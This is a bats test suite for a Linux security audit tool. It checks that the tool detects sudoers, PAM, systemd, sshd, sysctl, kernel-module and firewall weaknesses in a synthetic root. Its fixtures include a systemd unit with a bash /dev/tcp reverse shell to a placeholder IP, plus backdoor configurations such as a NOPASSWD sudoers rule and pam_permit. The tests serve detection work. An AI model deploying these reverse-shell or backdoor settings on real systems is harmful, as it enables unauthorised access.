#!/usr/bin/env bats
# Standing-state and persistence coverage added after the engineering audit: sudoers includes and
# Defaults, primary-group privilege, PAM continuation and module hashes, symlinked systemd units,
# ld.so.conf, cron/at access files, auditd rules, sshd settings, kernel hardening sysctls, kernel
# modules, the host firewall and the rpm package-integrity backend. Synthetic data only.

load test_helper

setup() {
  make_root
  use_fake_tools
}

# The fixture sudoers is 0440 (root can append, an unprivileged test user cannot): make the
# disposable copy writable for the edit and restore the mode, which the audit inspects.
append_sudoers() { # TEXT
  chmod 640 "${ROOT}/etc/sudoers"
  printf '%b' "$1" >>"${ROOT}/etc/sudoers"
  chmod 440 "${ROOT}/etc/sudoers"
}

finding_refs() { json_py "sorted(e['ref'] for f in d['findings'] if f['id']=='$1' for e in f.get('evidence',[]))"; }
excerpts() { json_py "sorted(e.get('excerpt','') for f in d['findings'] if f['id']=='$1' for e in f.get('evidence',[]))"; }
rec_attr() { json_py "[r['attrs']['$2'] for r in d['inventory']['records'] if r['key']=='$1'][0]"; }
has_rec() { json_py "'$1' in [r['key'] for r in d['inventory']['records']]" | grep -qx True; }

# ------------------------------------------------------------------------------- sudoers

@test "sudoers: an #includedir outside /etc/sudoers.d is reported and its rules are analysed" {
  append_sudoers '#includedir /tmp/evil.d\n'
  mkdir -p "${ROOT}/tmp/evil.d"
  echo 'mallory ALL=(ALL) NOPASSWD: ALL' >"${ROOT}/tmp/evil.d/x"
  run_audit --modules users
  has_finding USR-SUDO-004
  [ "$(finding_sev USR-SUDO-004)" = "high" ]
  evidence_has USR-SUDO-002 '/tmp/evil.d/x'
  # the rule text keeps what it grants (the NOPASSWD tag is not a secret)
  [[ "$(excerpts USR-SUDO-002)" == *"NOPASSWD: ALL"* ]]
}

@test "sudoers: a non-default but ordinary include is medium and a normal sudoers.d is silent" {
  run_audit --modules users
  no_finding USR-SUDO-004
  append_sudoers '@includedir /usr/local/etc/sudoers.d\n'
  run_audit --modules users
  [ "$(finding_sev USR-SUDO-004)" = "medium" ]
}

@test "sudoers: a comment that merely mentions include is not a directive" {
  append_sudoers '# includes are handled elsewhere\n#include-ish text\n'
  run_audit --modules users
  no_finding USR-SUDO-004
}

@test "sudoers: include loops terminate" {
  mkdir -p "${ROOT}/tmp/a.d"
  append_sudoers '#include /tmp/loop1\n'
  printf '#include /tmp/loop2\n' >"${ROOT}/tmp/loop1"
  printf '#include /tmp/loop1\n' >"${ROOT}/tmp/loop2"
  run timeout 60 "${AUDIT}" --modules users --json --no-color
  [ "${status}" -ne 124 ]
}

@test "sudoers: Defaults and aliases are inventoried; dangerous Defaults are a finding" {
  append_sudoers 'Defaults !authenticate\nUser_Alias ADMINS = mallory\nDefaults env_keep += "LD_PRELOAD"\n'
  run_audit --modules users
  has_finding USR-SUDO-005
  [ "$(finding_sev USR-SUDO-005)" = "high" ]
  [ "$(json_py "sum(1 for r in d['inventory']['records'] if r['key'].startswith('config:sudoers:/etc/sudoers#') and ('Defaults' in r['attrs']['rule'] or 'User_Alias' in r['attrs']['rule']))")" -ge 3 ]
}

@test "sudoers: harmless Defaults do not raise USR-SUDO-005" {
  append_sudoers 'Defaults env_reset\nDefaults secure_path="/usr/sbin:/usr/bin"\nDefaults use_pty\n'
  run_audit --modules users
  no_finding USR-SUDO-005
}

# ---------------------------------------------------------------------- primary group

@test "groups: an account whose primary group is administrative is reported and recorded" {
  printf 'ops:x:1100:27::/home/ops:/bin/bash\n' >>"${ROOT}/etc/passwd"
  run_audit --modules users
  has_finding USR-GROUP-003
  evidence_has USR-GROUP-003 'ops'
  [ "$(json_py "[r['attrs']['primary_members'] for r in d['inventory']['records'] if r['key']=='group:sudo'][0]")" = "['ops']" ]
}

@test "groups: ordinary primary groups produce nothing" {
  printf 'ops:x:1100:1100::/home/ops:/bin/bash\n' >>"${ROOT}/etc/passwd"
  run_audit --modules users
  json_py "[f['id'] for f in d['findings'] if f['id']=='USR-GROUP-003' and not any('toor' in e['ref'] + e.get('excerpt','') for e in f['evidence'])]" | grep -qx '\[\]'
}

# ------------------------------------------------------------------------------- PAM

@test "pam: a rule continued with a backslash is joined before it is judged" {
  printf 'auth sufficient \\\n   pam_permit.so\n' >"${ROOT}/etc/pam.d/cont"
  chmod 644 "${ROOT}/etc/pam.d/cont"
  run_audit --modules pam
  evidence_has PAM-PERMIT-001 '/etc/pam.d/cont'
}

@test "pam: a continued ordinary rule is not a false positive" {
  printf 'auth required \\\n   pam_unix.so nullok_secure\n' >"${ROOT}/etc/pam.d/ordinary"
  chmod 644 "${ROOT}/etc/pam.d/ordinary"
  run_audit --modules pam
  refute evidence_has PAM-PERMIT-001 '/etc/pam.d/ordinary'
}

@test "pam: referenced modules are hashed, so a replaced module is a change" {
  run_audit --modules pam
  has_rec "config:pam-module:/lib/x86_64-linux-gnu/security/pam_unix.so"
  before="$(rec_attr config:pam-module:/lib/x86_64-linux-gnu/security/pam_unix.so sha256)"
  [ "${#before}" -eq 64 ]
  echo tampered >>"${ROOT}/lib/x86_64-linux-gnu/security/pam_unix.so"
  run_audit --modules pam
  [ "$(rec_attr config:pam-module:/lib/x86_64-linux-gnu/security/pam_unix.so sha256)" != "${before}" ]
}

# ---------------------------------------------------------------------------- persistence

@test "systemd: a symlinked unit is inventoried with its target and scanned" {
  printf '[Service]\nExecStart=/bin/bash -i >& /dev/tcp/203.0.113.9/9001 0>&1\n' >"${ROOT}/tmp/evil2.service"
  ln -s ../../../tmp/evil2.service "${ROOT}/etc/systemd/system/evil2.service"
  run_audit --modules persistence
  has_rec "persist:systemd:/etc/systemd/system/evil2.service"
  [ "$(rec_attr persist:systemd:/etc/systemd/system/evil2.service target)" = "../../../tmp/evil2.service" ]
  evidence_has PER-SYSTEMD-001 '/etc/systemd/system/evil2.service'
}

@test "systemd: a dangling symlink is recorded, not dropped" {
  ln -s /nonexistent/unit.service "${ROOT}/etc/systemd/system/dangling.service"
  run_audit --modules persistence
  has_rec "persist:systemd:/etc/systemd/system/dangling.service"
  [ "$(rec_attr persist:systemd:/etc/systemd/system/dangling.service sha256)" = "None" ]
}

@test "systemd: enablement links in *.wants do not flood the administrator-unit finding" {
  mkdir -p "${ROOT}/etc/systemd/system/multi-user.target.wants"
  ln -s ../ok.service "${ROOT}/etc/systemd/system/multi-user.target.wants/ok.service"
  run_audit --modules persistence
  has_rec "persist:systemd:/etc/systemd/system/multi-user.target.wants/ok.service"
  refute evidence_has PER-SYSTEMD-002 'multi-user.target.wants'
}

@test "persistence: files carry a line count and line fingerprints, never line text" {
  run_audit --modules persistence
  [ "$(rec_attr persist:startup:/etc/rc.local lines)" = "2" ]
  [ "$(json_py "len([r['attrs']['line_ids'] for r in d['inventory']['records'] if r['key']=='persist:startup:/etc/rc.local'][0])")" = "2" ]
  refute grep -q 'dropper' <(json_py "[r['attrs'].get('line_ids') for r in d['inventory']['records'] if r['key']=='persist:startup:/etc/rc.local']")
  # vendor unit files stay hash-only
  mkdir -p "${ROOT}/usr/lib/systemd/system"
  printf '[Service]\nExecStart=/bin/true\n' >"${ROOT}/usr/lib/systemd/system/vendor.service"
  run_audit --modules persistence
  [ "$(json_py "'lines' in [r['attrs'] for r in d['inventory']['records'] if r['key']=='persist:systemd:/usr/lib/systemd/system/vendor.service'][0]")" = "False" ]
}

@test "ld.so.conf: a search path in /tmp or /home is high; ordinary paths are silent" {
  mkdir -p "${ROOT}/etc/ld.so.conf.d"
  echo /usr/lib/x86_64-linux-gnu >"${ROOT}/etc/ld.so.conf.d/ok.conf"
  run_audit --modules persistence
  no_finding PER-LDCONF-001
  echo /tmp/lib >"${ROOT}/etc/ld.so.conf.d/evil.conf"
  run_audit --modules persistence
  has_finding PER-LDCONF-001
  [ "$(finding_sev PER-LDCONF-001)" = "high" ]
  [ "$(finding_refs PER-LDCONF-001)" = "['/etc/ld.so.conf.d/evil.conf']" ]
}

@test "cron and at access files are inventoried" {
  echo mallory >"${ROOT}/etc/cron.allow"
  run_audit --modules persistence
  has_rec "persist:startup:/etc/cron.allow"
}

@test "auditd: an installed daemon with no rules is a finding; real rules and no auditd are silent" {
  run_audit --modules persistence
  no_finding PER-AUDITD-001
  mkdir -p "${ROOT}/etc/audit/rules.d"
  printf -- '-D\n-b 8192\n' >"${ROOT}/etc/audit/rules.d/audit.rules"
  run_audit --modules persistence
  has_finding PER-AUDITD-001
  printf -- '-w /etc/passwd -p wa -k identity\n' >>"${ROOT}/etc/audit/rules.d/audit.rules"
  run_audit --modules persistence
  no_finding PER-AUDITD-001
}

# ------------------------------------------------------------------------------- sshd

@test "sshd: first occurrence wins, Include is expanded and Match blocks are not global" {
  mkdir -p "${ROOT}/etc/ssh/sshd_config.d"
  printf 'Include /etc/ssh/sshd_config.d/*.conf\nPermitRootLogin prohibit-password\nMatch User bob\n  PermitRootLogin yes\n' >"${ROOT}/etc/ssh/sshd_config"
  run_audit --modules network
  [ "$(rec_attr config:sshd:permitrootlogin value)" = "prohibit-password" ]
  no_finding NET-SSHD-002
  printf 'PermitRootLogin yes\n' >"${ROOT}/etc/ssh/sshd_config.d/10-x.conf"
  run_audit --modules network
  [ "$(rec_attr config:sshd:permitrootlogin value)" = "yes" ]
  has_finding NET-SSHD-002
}

@test "sshd: dangerous directives are reported and a default configuration is quiet" {
  printf 'PasswordAuthentication yes\nPermitRootLogin prohibit-password\nAuthorizedKeysFile .ssh/authorized_keys\n' >"${ROOT}/etc/ssh/sshd_config" 2>/dev/null || { mkdir -p "${ROOT}/etc/ssh" && printf 'PasswordAuthentication yes\nPermitRootLogin prohibit-password\nAuthorizedKeysFile .ssh/authorized_keys\n' >"${ROOT}/etc/ssh/sshd_config"; }
  run_audit --modules network
  no_finding NET-SSHD-002
  printf 'PermitEmptyPasswords yes\nAuthorizedKeysFile /tmp/.k\nAuthorizedKeysCommand /usr/local/bin/keys\nPermitUserEnvironment yes\n' >"${ROOT}/etc/ssh/sshd_config"
  run_audit --modules network
  has_finding NET-SSHD-002
  [ "$(json_py "len([e for f in d['findings'] if f['id']=='NET-SSHD-002' for e in f['evidence']])")" = "4" ]
}

@test "sshd: no configuration file means no records and complete coverage" {
  rm -rf "${ROOT}/etc/ssh"
  run_audit --modules network
  [ "$(json_py "[r['key'] for r in d['inventory']['records'] if r['key'].startswith('config:sshd:')]")" = "[]" ]
  [[ "$(json_py "[c['status'] for c in d['inventory']['coverage'] if c['domain']=='config' and c.get('scope')=='sshd']")" == *complete* ]]
}

# --------------------------------------------------------------- kernel hardening sysctls

@test "sysctl: weak kernel hardening values are a standing finding; hardened values are silent" {
  mkdir -p "${ROOT}/proc/sys/kernel/yama"
  echo 2 >"${ROOT}/proc/sys/kernel/randomize_va_space"
  echo 1 >"${ROOT}/proc/sys/kernel/kptr_restrict"
  echo 1 >"${ROOT}/proc/sys/kernel/yama/ptrace_scope"
  run_audit --modules network
  no_finding NET-SYSCTL-001
  echo 0 >"${ROOT}/proc/sys/kernel/randomize_va_space"
  echo 0 >"${ROOT}/proc/sys/kernel/kptr_restrict"
  echo 0 >"${ROOT}/proc/sys/kernel/yama/ptrace_scope"
  run_audit --modules network
  has_finding NET-SYSCTL-001
  [ "$(json_py "len([e for f in d['findings'] if f['id']=='NET-SYSCTL-001' for e in f['evidence']])")" = "3" ]
  has_rec "config:sysctl:kernel.kptr_restrict"
  has_rec "config:sysctl:kernel.yama.ptrace_scope"
}

# ----------------------------------------------------------------------- kernel modules

@test "kmod: loaded modules are inventoried and flagged ones are a finding" {
  printf 'ext4 1 1 - Live 0x0\nrootkitmod 1 0 - Live 0x0\n' >"${ROOT}/proc/modules"
  mkdir -p "${ROOT}/sys/module/rootkitmod"
  echo OE >"${ROOT}/sys/module/rootkitmod/taint"
  run_audit --modules system
  [ "$(rec_attr config:kmod:rootkitmod taint)" = "OE" ]
  [ "$(rec_attr config:kmod:ext4 taint)" = "none" ]
  evidence_has SYS-KMOD-001 'rootkitmod'
}

@test "kmod: a module name that tries to leave /sys/module is never used as a path" {
  printf '../../etc 1 0 - Live 0x0\n' >"${ROOT}/proc/modules"
  mkdir -p "${ROOT}/etc"
  echo OE >"${ROOT}/etc/taint"
  run_audit --modules system
  [ "$(rec_attr 'config:kmod:../../etc' taint)" = "none" ]
  no_finding SYS-KMOD-001
}

@test "kmod: a kernel without /proc/modules is complete with no records" {
  rm -f "${ROOT}/proc/modules"
  run_audit --modules system
  [ "$(json_py "[r['key'] for r in d['inventory']['records'] if r['key'].startswith('config:kmod:')]")" = "[]" ]
}

# --------------------------------------------------------------------------- firewall

make_shim() { # NAME BODY
  mkdir -p "${BATS_TEST_TMPDIR}/shim"
  printf '#!/bin/sh\ntouch "%s/called-%s"\n%s\n' "${BATS_TEST_TMPDIR}" "$1" "$2" >"${BATS_TEST_TMPDIR}/shim/$1"
  chmod 755 "${BATS_TEST_TMPDIR}/shim/$1"
  export PATH="${BATS_TEST_TMPDIR}/shim:${PATH}"
}

@test "firewall: iptables is not run when its kernel module is not loaded" {
  make_shim iptables 'echo "-P INPUT ACCEPT"'
  run_audit --modules network
  [ ! -e "${BATS_TEST_TMPDIR}/called-iptables" ]
  [ "$(json_py "[r['key'] for r in d['inventory']['records'] if r['key'].startswith('config:firewall:')]")" = "[]" ]
}

@test "firewall: an empty ACCEPT ruleset is a finding; a DROP policy with rules is quiet" {
  mkdir -p "${ROOT}/proc/net"
  : >"${ROOT}/proc/net/ip_tables_names"
  make_shim iptables 'echo "-P INPUT ACCEPT"; echo "-P FORWARD ACCEPT"; echo "-P OUTPUT ACCEPT"'
  run_audit --modules network
  has_finding NET-FW-002
  [ "$(rec_attr config:firewall:linux-iptables policy_input)" = "ACCEPT" ]
  make_shim iptables 'echo "-P INPUT DROP"; echo "-A INPUT -p tcp --dport 22 -j ACCEPT"; echo "-A INPUT -p tcp --dport 80 -j ACCEPT"'
  run_audit --modules network
  no_finding NET-FW-002
  [ "$(rec_attr config:firewall:linux-iptables rules)" = "2" ]
}

@test "firewall: an unreadable ruleset is a coverage gap, never a result" {
  mkdir -p "${ROOT}/proc/net"
  : >"${ROOT}/proc/net/ip_tables_names"
  make_shim iptables 'exit 1'
  run_audit --modules network
  [[ "$(json_py "[c['status'] for c in d['inventory']['coverage'] if c['domain']=='config' and c.get('scope')=='firewall']")" == *partial* ]]
  [ "$(json_py "[r['key'] for r in d['inventory']['records'] if r['key'].startswith('config:firewall:')]")" = "[]" ]
}

@test "firewall: nftables is read only when nf_tables is loaded" {
  make_shim nft 'printf "table inet filter {\n  chain input {\n    type filter hook input priority 0; policy drop;\n    ct state established accept\n    tcp dport 22 accept\n  }\n}\n"'
  run_audit --modules network
  [ ! -e "${BATS_TEST_TMPDIR}/called-nft" ]
  printf 'nf_tables 1 0 - Live 0x0\n' >"${ROOT}/proc/modules"
  run_audit --modules network
  [ -e "${BATS_TEST_TMPDIR}/called-nft" ]
  [ "$(rec_attr config:firewall:linux-nft policy_input)" = "DROP" ]
}

# --------------------------------------------------------------------- rpm integrity

@test "package integrity: the rpm backend classifies content changes, config and metadata" {
  rm -f "${ROOT}/var/lib/dpkg/status"
  mkdir -p "${ROOT}/var/lib/rpm"
  make_shim rpm 'cat <<OUT
S.5....T.    /usr/bin/ssh
S.5....T.  c /etc/ssh/sshd_config
.M.......  c /etc/default/foo
missing    c /etc/gone.conf
.M.......    /usr/bin/ls
.......T.  d /usr/share/doc/foo/README
..5......    /opt/app/data.bin
OUT'
  BO_FORCE_MISSING_TOOLS="dpkg ip route ifconfig netstat systemd-detect-virt" run_audit --modules filesystem --package-integrity --fail-on critical
  evidence_has FS-PKG-001 '/usr/bin/ssh'
  refute evidence_has FS-PKG-001 '/usr/bin/ls' # a mode-only difference is routine
  evidence_has FS-PKG-002 '/usr/bin/ls'
  evidence_has FS-PKG-004 '/etc/ssh/sshd_config'
  [[ "$(json_py "[f['description'] for f in d['findings'] if f['id']=='FS-PKG-003'][0]")" == *"rpm:"* ]]
  [[ "$(json_py "[f['description'] for f in d['findings'] if f['id']=='FS-PKG-003'][0]")" == *"root-writable"* ]]
}

@test "package integrity: dpkg findings state the MD5 trust limit" {
  run_audit --modules filesystem --package-integrity --fail-on critical
  [[ "$(json_py "[f['description'] for f in d['findings'] if f['id']=='FS-PKG-003'][0]")" == *"MD5 is weak"* ]]
}

@test "package integrity: with neither database the gap is recorded" {
  rm -f "${ROOT}/var/lib/dpkg/status"
  BO_FORCE_MISSING_TOOLS="dpkg rpm ip route ifconfig netstat systemd-detect-virt" run_audit --modules filesystem --package-integrity
  has_error PKG_UNSUPPORTED
}
